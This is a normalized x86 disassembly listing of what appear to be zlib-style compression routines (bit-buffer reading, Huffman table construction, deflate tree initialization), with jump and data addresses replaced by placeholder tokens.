mov [ esi ] 0xf
jmp r-xdata
mov edx [ esp + 0x20 ]
mov [ esp + 0x24 ] edx
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
jmp r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
mov cl [ eax ]
mov edx [ esp + 0x8 ]
mov [ edx ] cl
inc eax
inc [ esp + 0x8 ]
dec [ esp + 0x1c ]
jne r-xdata
cmp [ esi + 0x3c ] 0x0
jne r-xdata
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0xc ]
jbe r-xdata
mov ecx [ esi + 0x3c ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp edx [ esp + 0x1c ]
jae r-xdata
xor ecx ecx
xor ebx ebx
mov [ esp + 0x10 ] ecx
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ esi + 0x14 ] eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_46797c
mov [ esi + 0x18 ] eax
mov edx [ esp ]
mov [ edx + 0x30 ] eax
test [ esp + 0x11 ] 0x2
je r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
xor ecx ecx
mov ecx 0x40
jmp r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x18 ]
mov eax [ esi + 0x18 ]
mov edx [ edx + 0xc ]
sub edx [ esp + 0x18 ]
call sub_46797c
mov [ esi + 0x18 ] eax
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov [ esi ] 0x7
jmp r-xdata
dec edx
je r-xdata
xor edx edx
mov dl [ esp + 0x21 ]
add edx 0x7
cmp ebx edx
jb r-xdata
jmp r-xdata
xor edx edx
mov dl [ esp + 0x21 ]
add edx 0x2
cmp ebx edx
jb r-xdata
test edi edi
je r-xdata
mov al [ esp + 0x21 ]
xor edx edx
mov ecx eax
mov dl al
shr [ esp + 0x10 ] cl
sub ebx edx
mov eax [ esi + 0x64 ]
inc [ esi + 0x64 ]
mov dx [ esp + 0x22 ]
mov [ esi + eax * 2 + 0x6c ] dx
jmp r-xdata
test [ esp + 0x20 ] 0x40
je r-xdata
mov [ esi ] 0x3
jmp r-xdata
mov cl [ esp + 0x25 ]
xor edx edx
shr [ esp + 0x10 ] cl
mov dl [ esp + 0x25 ]
sub ebx edx
test edi edi
je r-xdata
xor ecx ecx
xor eax eax
mov al [ esp + 0x24 ]
mov cl [ esp + 0x25 ]
add ecx eax
mov edx 0x1
shl edx cl
dec edx
mov cl [ esp + 0x25 ]
and edx [ esp + 0x10 ]
movzx eax [ esp + 0x26 ]
shr edx cl
mov ecx [ esi + 0x4c ]
add edx eax
xor eax eax
mov edx [ ecx + edx * 4 ]
mov [ esp + 0x20 ] edx
xor edx edx
mov dl [ esp + 0x21 ]
mov al [ esp + 0x25 ]
add eax edx
cmp ebx eax
jae r-xdata
mov [ esi ] 0xa
jmp r-xdata
mov ecx 0x3
mov ecx 0x1
jmp r-xdata
xor eax eax
mov eax 0x80
jmp r-xdata
add ecx [ esi + 0x38 ]
cmp [ esi ] 0x3
jne r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
test edi edi
je r-xdata
mov al [ esp + 0x21 ]
xor edx edx
mov ecx eax
mov dl al
shr [ esp + 0x10 ] cl
sub ebx edx
xor eax eax
mov edx [ esp + 0x10 ]
and edx 0x7f
add edx 0xb
mov [ esp + 0x1c ] edx
shr [ esp + 0x10 ] 0x7
sub ebx 0x7
xor edx edx
mov dl [ esp + 0x21 ]
add edx 0x3
cmp ebx edx
jb r-xdata
test edi edi
je r-xdata
mov al [ esp + 0x21 ]
xor edx edx
mov ecx eax
mov dl al
shr [ esp + 0x10 ] cl
sub ebx edx
cmp [ esi + 0x64 ] 0x0
jne r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
xor edx edx
mov dl [ esp + 0x20 ]
and edx 0xf
mov [ esi + 0x44 ] edx
mov [ esi ] 0xb
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
jmp r-xdata
mov [ esi ] ecx
xor eax eax
xor ebx ebx
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x4
jne r-xdata
cmp [ esp + 0x18 ] 0x0
je r-xdata
add ecx eax
mov edx [ esp ]
mov [ edx + 0x2c ] ecx
cmp [ esp + 0x14 ] 0x0
jne r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
mov edx [ esp + 0x1c ]
add [ esp + 0x1c ] 0xffffffff
test edx edx
jne r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
test edi edi
je r-xdata
mov al [ esp + 0x21 ]
xor edx edx
mov ecx eax
mov dl al
shr [ esp + 0x10 ] cl
sub ebx edx
xor eax eax
mov edx [ esp + 0x10 ]
and edx 0x7
add edx 0x3
mov [ esp + 0x1c ] edx
shr [ esp + 0x10 ] 0x3
sub ebx 0x3
jmp r-xdata
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
mov edx [ esi + 0x64 ]
movzx eax [ esi + edx * 2 + 0x6a ]
mov edx [ esp + 0x10 ]
and edx 0x3
add edx 0x3
mov [ esp + 0x1c ] edx
shr [ esp + 0x10 ] 0x2
sub ebx 0x2
jmp r-xdata
mov eax [ esp ]
mov [ eax + 0x18 ] rw-data
mov [ esi ] 0x12
jmp r-xdata
xor ecx ecx
xor eax eax
mov al [ esp + 0x24 ]
mov cl [ esp + 0x25 ]
add ecx eax
mov edx 0x1
shl edx cl
dec edx
mov cl [ esp + 0x25 ]
and edx [ esp + 0x10 ]
movzx eax [ esp + 0x26 ]
shr edx cl
mov ecx [ esi + 0x48 ]
add edx eax
xor eax eax
mov edx [ ecx + edx * 4 ]
mov [ esp + 0x20 ] edx
xor edx edx
mov dl [ esp + 0x21 ]
mov al [ esp + 0x25 ]
add eax edx
cmp ebx eax
jae r-xdata
mov eax [ esp + 0x28 ]
cmp [ esp + 0x28 ] 0x0
jne r-xdata
mov ecx [ esi + 0x64 ]
inc [ esi + 0x64 ]
mov [ esi + ecx * 2 + 0x6c ] ax
xor eax eax
mov ecx ebx
mov al [ ebp ]
inc ebp
shl eax cl
add [ esp + 0x10 ] eax
dec edi
add ebx 0x8
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x5c ]
add edx [ esi + 0x60 ]
add ecx [ esp + 0x1c ]
cmp ecx edx
jbe r-xdata
mov [ esp + 0x28 ] 0xfffffffb
sub_46aa4c
push ebx
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0xfffffffe
pop ebx
retn
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
xor ecx ecx
xor eax eax
mov [ ebx + 0x1c ] ecx
pop ebx
retn
mov ecx [ ebx + 0x28 ]
mov eax ecx
call [ ebx + 0x24 ]
sub_46aa8c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov edi eax
test edi edi
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ edi + 0x1c ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ edi + 0x1c ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ ebx ] 0x2
jne r-xdata
cmp [ ebx ] 0x2
je r-xdata
mov edx [ edi + 0x10 ]
mov eax edi
call sub_469a8c
test eax eax
je r-xdata
xor ecx ecx
xor edx edx
xor eax eax
call sub_46797c
mov ecx esi
mov edx ebp
call sub_46797c
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov eax [ ebx + 0x24 ]
cmp esi eax
jbe r-xdata
mov [ ebx ] 0x13
mov eax 0xfffffffc
jmp r-xdata
mov eax 0xfffffffd
jmp r-xdata
push esi
push ebp
mov eax [ ebx + 0x30 ]
add eax [ ebx + 0x24 ]
sub eax esi
push eax
call sub_4676d0
add esp 0xc
mov [ ebx + 0x28 ] esi
push eax
add ebp esi
sub ebp eax
push ebp
mov edx [ ebx + 0x30 ]
push edx
call sub_4676d0
add esp 0xc
mov ecx [ ebx + 0x24 ]
mov [ ebx + 0x28 ] ecx
jmp r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
sub_46ab48
push ebx
push esi
push edi
push ebp
mov ebx [ eax ]
xor esi esi
jmp r-xdata
cmp ecx esi
jbe r-xdata
mov [ eax ] ebx
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx 0x4
jb r-xdata
movzx edi [ edx ]
cmp ebx 0x2
jae r-xdata
mov ebp 0xff
xor ebp ebp
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
inc ebx
jmp r-xdata
cmp edi ebp
jne r-xdata
mov edi 0x4
sub edi ebx
mov ebx edi
xor ebx ebx
jmp r-xdata
inc esi
inc edx
sub_46ab90
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
test esi esi
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
mov ebx [ esi + 0x1c ]
jne r-xdata
cmp [ ebx ] 0x14
je r-xdata
cmp [ ebx + 0x38 ] 0x8
jae r-xdata
lea eax [ ebx + 0x64 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
call sub_46ab48
sub [ esi + 0x4 ] eax
add [ esi ] eax
add [ esi + 0x8 ] eax
cmp [ ebx + 0x64 ] 0x4
je r-xdata
mov [ ebx ] 0x14
mov ecx [ ebx + 0x38 ]
and ecx 0x7
shl [ ebx + 0x34 ] cl
mov edx [ ebx + 0x38 ]
and edx 0x7
sub [ ebx + 0x38 ] edx
xor eax eax
mov edx esp
jmp r-xdata
mov eax 0xfffffffb
jmp r-xdata
mov edi [ esi + 0x8 ]
mov ebp [ esi + 0x14 ]
mov eax esi
call sub_4698d8
mov [ esi + 0x8 ] edi
mov [ esi + 0x14 ] ebp
mov [ ebx ] 0x3
xor eax eax
mov eax 0xfffffffd
jmp r-xdata
cmp [ ebx + 0x38 ] 0x8
jae r-xdata
mov cl [ ebx + 0x34 ]
inc eax
mov [ edx ] cl
inc edx
shr [ ebx + 0x34 ] 0x8
sub [ ebx + 0x38 ] 0x8
lea ecx [ ebx + 0x64 ]
xor edx edx
xchg ecx eax
mov [ ebx + 0x64 ] edx
mov edx esp
call sub_46ab48
sub_46ac50
test eax eax
je r-xdata
mov eax 0xfffffffe
retn
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ eax + 0x1c ]
cmp [ eax ] 0x5
jne r-xdata
xor edx edx
jmp r-xdata
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax edx
retn
mov edx 0x1
sub_46ac7c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov ebx [ esi + 0x1c ]
mov ecx 0x252c
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov edi eax
test edi edi
jne r-xdata
xor ebp ebp
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
push 0x38
push esi
mov edx [ esp + 0x8 ]
push edx
call sub_4676d0
add esp 0xc
push 0x252c
push ebx
push edi
call sub_4676d0
add esp 0xc
lea eax [ ebx + 0x52c ]
mov edx [ ebx + 0x48 ]
cmp eax edx
ja r-xdata
mov ecx [ ebx + 0x20 ]
mov edx 0x1
shl edx cl
mov ecx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebp eax
test ebp ebp
jne r-xdata
mov ecx [ ebx + 0x68 ]
sub ecx eax
test ecx ecx
jns r-xdata
lea ecx [ ebx + 0x2528 ]
cmp edx ecx
ja r-xdata
mov edx edi
mov eax [ esi + 0x28 ]
call [ esi + 0x24 ]
mov eax 0xfffffffc
jmp r-xdata
sar ecx 0x2
shl ecx 0x2
add ecx edi
add ecx 0x52c
test ebp ebp
mov [ edi + 0x68 ] ecx
je r-xdata
add ecx 0x3
sub edx eax
test edx edx
jns r-xdata
mov [ edi + 0x30 ] ebp
mov eax [ esp ]
mov [ eax + 0x1c ] edi
xor eax eax
mov ecx [ ebx + 0x20 ]
mov eax 0x1
shl eax cl
push eax
mov edx [ ebx + 0x30 ]
push edx
push ebp
call sub_4676d0
add esp 0xc
sar edx 0x2
shl edx 0x2
add edx edi
add edx 0x52c
mov [ edi + 0x48 ] edx
mov edx [ ebx + 0x4c ]
sub edx eax
test edx edx
jns r-xdata
add edx 0x3
sar edx 0x2
shl edx 0x2
add edx edi
add edx 0x52c
mov [ edi + 0x4c ] edx
add edx 0x3
sub_46adbc
push ebp
mov ebp esp
add esp 0xffffff7c
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x64 ]
mov [ eax ] 0x0
inc [ ebp - 0xc ]
add eax 0x2
cmp [ ebp - 0xc ] 0xf
jbe r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax ]
lea eax [ ebp - 0x46 ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] 0xf
movzx ebx [ eax ]
add eax 0x2
inc edx
inc [ ebp + ebx * 2 - 0x64 ]
cmp ecx edx
ja r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x14 ]
jbe r-xdata
dec [ ebp - 0x14 ]
add eax 0xfffffffe
cmp [ ebp - 0x14 ] 0x1
jae r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
cmp [ eax ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
lea edx [ ebp - 0x62 ]
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x30 ] 0x40
mov [ ebp - 0x2f ] 0x1
mov [ ebp - 0x2e ] 0x0
mov edx [ ebp + 0x10 ]
mov ecx [ edx ]
add [ edx ] 0x4
mov eax [ ebp - 0x30 ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ edx ]
add [ edx ] 0x4
mov eax [ ebp - 0x30 ]
mov [ ecx ] eax
xor eax eax
mov edx [ ebp + 0xc ]
mov [ edx ] 0x1
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
inc [ ebp - 0x10 ]
add [ ebp - 0x44 ] 0x2
cmp [ ebp - 0x10 ] 0xf
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0xc ] 0x1
mov edx 0x1
lea eax [ ebp - 0x62 ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x44 ]
cmp [ eax ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
add eax 0x2
cmp [ ebp - 0xc ] 0xf
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
add edx edx
movzx ebx [ eax ]
sub edx ebx
test edx edx
jge r-xdata
test edx edx
jle r-xdata
mov [ ebp - 0x82 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edx [ ebp - 0x62 ]
lea eax [ ebp - 0x82 ]
mov [ ebp - 0x44 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dx [ eax ]
mov ebx [ ebp - 0x44 ]
add dx [ ebx ]
mov [ eax + 0x2 ] dx
add eax 0x2
inc [ ebp - 0xc ]
add [ ebp - 0x44 ] 0x2
cmp [ ebp - 0xc ] 0xf
jb r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x44 ] eax
cmp ecx edx
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x14 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x1
jb r-xdata
mov eax [ ebp - 0x44 ]
mov ax [ eax ]
test ax ax
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x40 ] 0x13
jmp r-xdata
je r-xdata
inc edx
add [ ebp - 0x44 ] 0x2
cmp ecx edx
ja r-xdata
movzx eax ax
mov bx [ ebp + eax * 2 - 0x84 ]
inc [ ebp + eax * 2 - 0x84 ]
movzx eax bx
mov ebx [ ebp + 0x8 ]
mov [ ebx + eax * 2 ] dx
mov eax [ ebp - 0x10 ]
mov ebx 0x1
mov [ ebp - 0xc ] eax
xor esi esi
mov ecx [ ebp + 0x10 ]
xor edx edx
mov eax [ ecx ]
xor ecx ecx
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x28 ] 0xffffffff
mov ecx [ ebp - 0x18 ]
shl ebx cl
mov [ ebp - 0x20 ] ebx
mov ecx [ ebp - 0x20 ]
dec ecx
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x38 ] rw-data
sub [ ebp - 0x38 ] 0x202
mov [ ebp - 0x3c ] rw-data
sub [ ebp - 0x3c ] 0x202
mov [ ebp - 0x40 ] 0x100
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx * 2 ]
mov [ ebp - 0x44 ] edx
cmp [ ebp - 0x20 ] 0x5b0
jb r-xdata
mov [ ebp - 0x38 ] rw-data
mov [ ebp - 0x3c ] rw-data
mov [ ebp - 0x40 ] 0xffffffff
cmp edx [ ebp - 0x40 ]
jle r-xdata
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2e ] cx
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov [ ebp - 0x30 ] 0x60
mov [ ebp - 0x2e ] 0x0
mov ecx [ ebp - 0x3c ]
mov cl [ ecx + edx * 2 ]
mov [ ebp - 0x30 ] cl
mov ecx [ ebp - 0x38 ]
mov dx [ ecx + edx * 2 ]
mov [ ebp - 0x2e ] dx
jmp r-xdata
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x1c ]
mov edx 0x1
shl edx cl
mov ecx eax
mov ebx 0x1
shl ebx cl
mov [ ebp - 0x24 ] ebx
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] ecx
sub [ ebp - 0x24 ] edx
mov ecx [ ebp - 0x1c ]
mov ebx esi
shr ebx cl
add ebx [ ebp - 0x24 ]
mov ecx [ ebp - 0x34 ]
mov edi [ ebp - 0x30 ]
mov [ ecx + ebx * 4 ] edi
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
dec ecx
mov edx 0x1
shl edx cl
jmp r-xdata
test edx esi
jne r-xdata
shr edx 0x1
test edx edx
je r-xdata
xor esi esi
mov ecx edx
dec ecx
and esi ecx
add esi edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x18 ]
jbe r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
je r-xdata
add [ ebp - 0x44 ] 0x2
mov edx [ ebp - 0xc ]
dec [ ebp + edx * 2 - 0x64 ]
mov cx [ ebp + edx * 2 - 0x64 ]
test cx cx
jne r-xdata
mov dl [ ebp - 0xc ]
sub dl [ ebp - 0x1c ]
mov [ ebp - 0x2f ] dl
mov ecx [ ebp - 0x44 ]
mov cx [ ecx ]
movzx edx cx
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebp - 0x2c ]
and edx esi
cmp edx [ ebp - 0x28 ]
je r-xdata
mov [ ebp - 0x30 ] 0x40
mov al [ ebp - 0xc ]
sub al [ ebp - 0x1c ]
mov [ ebp - 0x2f ] al
mov [ ebp - 0x2e ] 0x0
test esi esi
je r-xdata
mov ecx [ ebp - 0x44 ]
movzx edx [ ecx ]
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + edx * 2 ]
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ ebp + 0x10 ]
shl eax 0x2
add [ edx ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x18 ]
mov [ ecx ] eax
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
shl ecx 0x2
add [ ebp - 0x34 ] ecx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x1c ]
mov ecx eax
mov edx 0x1
shl edx cl
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
mov edx esi
shr edx cl
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x30 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0xc ]
dec ecx
mov edx 0x1
shl edx cl
jmp r-xdata
mov edx [ ebp - 0x2c ]
and edx esi
cmp edx [ ebp - 0x28 ]
je r-xdata
mov ecx [ ebp - 0x1c ]
add ecx eax
cmp ecx [ ebp - 0x14 ]
jb r-xdata
test edx esi
jne r-xdata
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ edx ]
mov [ ebp - 0x34 ] ecx
mov al [ ebp - 0xc ]
mov [ ebp - 0x2f ] al
movzx ecx [ ebp + ecx * 2 - 0x64 ]
sub edx ecx
test edx edx
jle r-xdata
mov ecx eax
mov edx 0x1
shl edx cl
add [ ebp - 0x20 ] edx
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
shr edx 0x1
test edx edx
je r-xdata
inc eax
add edx edx
mov edx [ ebp - 0x2c ]
and edx esi
mov [ ebp - 0x28 ] edx
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x28 ]
mov [ edx + ecx * 4 ] al
mov ecx [ ebp - 0x28 ]
mov bl [ ebp - 0x18 ]
mov [ edx + ecx * 4 + 0x1 ] bl
mov ecx [ ebp - 0x34 ]
sub ecx edx
test ecx ecx
jns r-xdata
cmp [ ebp - 0x20 ] 0x5b0
jb r-xdata
xor esi esi
mov eax edx
dec eax
and esi eax
add esi edx
jmp r-xdata
sar ecx 0x2
mov ebx [ ebp - 0x28 ]
mov [ edx + ebx * 4 + 0x2 ] cx
jmp r-xdata
add ecx 0x3
mov eax 0x1
jmp r-xdata
test esi esi
jne r-xdata
sub_46b230
push ebx
mov ebx eax
call sub_46b22c
lea eax [ ebx + 0x90 ]
lea edx [ ebx + 0x984 ]
mov [ ebx + 0xb14 ] eax
lea ecx [ ebx + 0xa78 ]
mov [ ebx + 0xb1c ] rw-data
mov [ ebx + 0xb20 ] edx
xor eax eax
mov [ ebx + 0xb28 ] rw-data
mov [ ebx + 0xb2c ] ecx
mov [ ebx + 0xb34 ] rw-data
mov [ ebx + 0x16b4 ] 0x0
mov [ ebx + 0x16b8 ] eax
mov eax ebx
mov [ ebx + 0x16b0 ] 0x8
call sub_46b2a0
pop ebx
retn
sub_46b2a0
xor edx edx
lea ecx [ eax + 0x90 ]
mov [ ecx ] 0x0
inc edx
add ecx 0x4
cmp edx 0x11e
jl r-xdata
xor edx edx
lea ecx [ eax + 0x984 ]
mov [ ecx ] 0x0
inc edx
add ecx 0x4
cmp edx 0x1e
jl r-xdata
xor edx edx
lea ecx [ eax + 0xa78 ]
mov [ ecx ] 0x0
inc edx
add ecx 0x4
cmp edx 0x13
jl r-xdata
mov [ eax + 0x490 ] 0x1
xor edx edx
xor ecx ecx
mov [ eax + 0x16a8 ] edx
mov [ eax + 0x16a4 ] edx
mov [ eax + 0x16ac ] ecx
mov [ eax + 0x169c ] ecx
retn
sub_46b30c
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] ecx
mov ecx [ esp ]
mov ecx [ eax + ecx * 4 + 0xb58 ]
mov [ esp + 0x4 ] ecx
mov ecx [ esp + 0x4 ]
mov esi [ esp ]
add esi esi
lea ecx [ eax + ecx + 0x1454 ]
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x4 ]
lea ecx [ edx + ecx * 4 ]
jmp r-xdata
cmp esi [ eax + 0x144c ]
jle r-xdata
cmp esi [ eax + 0x144c ]
jge r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x4 ]
mov [ eax + edx * 4 + 0xb58 ] ecx
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + esi * 4 + 0xb58 ]
mov bx [ edx + ebx * 4 ]
cmp bx [ ecx ]
ja r-xdata
mov ebx [ eax + esi * 4 + 0xb5c ]
mov edi [ eax + esi * 4 + 0xb58 ]
mov bx [ edx + ebx * 4 ]
cmp bx [ edx + edi * 4 ]
jb r-xdata
mov edi [ eax + esi * 4 + 0xb58 ]
mov bx [ edx + edi * 4 ]
cmp bx [ ecx ]
jne r-xdata
inc esi
mov ebx [ eax + esi * 4 + 0xb5c ]
mov edi [ eax + esi * 4 + 0xb58 ]
mov bx [ edx + ebx * 4 ]
cmp bx [ edx + edi * 4 ]
jne r-xdata
mov ebx [ esp ]
mov edi [ eax + esi * 4 + 0xb58 ]
mov [ eax + ebx * 4 + 0xb58 ] edi
mov [ esp ] esi
add esi esi
mov ebx [ esp + 0x8 ]
mov bl [ ebx ]
cmp bl [ eax + edi + 0x1454 ]
jbe r-xdata
mov ebx [ eax + esi * 4 + 0xb5c ]
mov edi [ eax + esi * 4 + 0xb58 ]
mov bl [ eax + ebx + 0x1454 ]
cmp bl [ eax + edi + 0x1454 ]
ja r-xdata
sub_46b400
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov [ esp ] eax
mov eax [ edx + 0x4 ]
mov esi [ edx ]
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x8 ]
xor edx edx
mov ecx [ eax ]
mov [ esp + 0x8 ] ecx
mov ecx [ eax + 0x4 ]
mov [ esp + 0xc ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x10 ] ecx
mov eax [ eax + 0x10 ]
mov [ esp + 0x20 ] edx
xor edx edx
mov ecx [ esp ]
add ecx 0xb38
mov [ ecx ] 0x0
inc edx
add ecx 0x2
cmp edx 0xf
jle r-xdata
mov edx [ esp ]
mov ecx [ esp ]
mov edx [ edx + 0x1450 ]
mov edx [ ecx + edx * 4 + 0xb58 ]
mov [ esi + edx * 4 + 0x2 ] 0x0
mov ecx [ esp ]
mov edx [ ecx + 0x1450 ]
inc edx
mov [ esp + 0x14 ] edx
cmp [ esp + 0x14 ] 0x23d
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
lea ecx [ ecx + edx * 4 + 0xb58 ]
jge r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov ebx [ ecx ]
movzx edx [ esi + ebx * 4 + 0x2 ]
movzx edx [ esi + edx * 4 + 0x2 ]
inc edx
cmp eax edx
jge r-xdata
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax - 0x1 ]
mov ecx [ esp ]
lea ecx [ ecx + edx * 2 + 0xb38 ]
jmp r-xdata
mov [ esi + ebx * 4 + 0x2 ] dx
cmp ebx [ esp + 0x4 ]
jg r-xdata
mov edx eax
inc [ esp + 0x20 ]
cmp [ ecx ] 0x0
je r-xdata
inc [ esp + 0x14 ]
add ecx 0x4
cmp [ esp + 0x14 ] 0x23d
jl r-xdata
mov edi [ esp ]
inc [ edi + edx * 2 + 0xb38 ]
xor edi edi
mov [ esp + 0x18 ] edi
cmp ebx [ esp + 0x10 ]
jl r-xdata
dec edx
add ecx 0xfffffffe
mov ecx [ esp ]
dec [ ecx + edx * 2 + 0xb38 ]
mov ecx [ esp ]
add [ ecx + edx * 2 + 0xb3a ] 0x2
mov edx [ esp ]
dec [ edx + eax * 2 + 0xb38 ]
sub [ esp + 0x20 ] 0x2
cmp [ esp + 0x20 ] 0x0
jg r-xdata
mov di [ esi + ebx * 4 ]
mov [ esp + 0x1c ] di
movzx edi [ esp + 0x1c ]
add edx [ esp + 0x18 ]
imul edi edx
mov edx [ esp ]
add [ edx + 0x16a4 ] edi
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov edi ebx
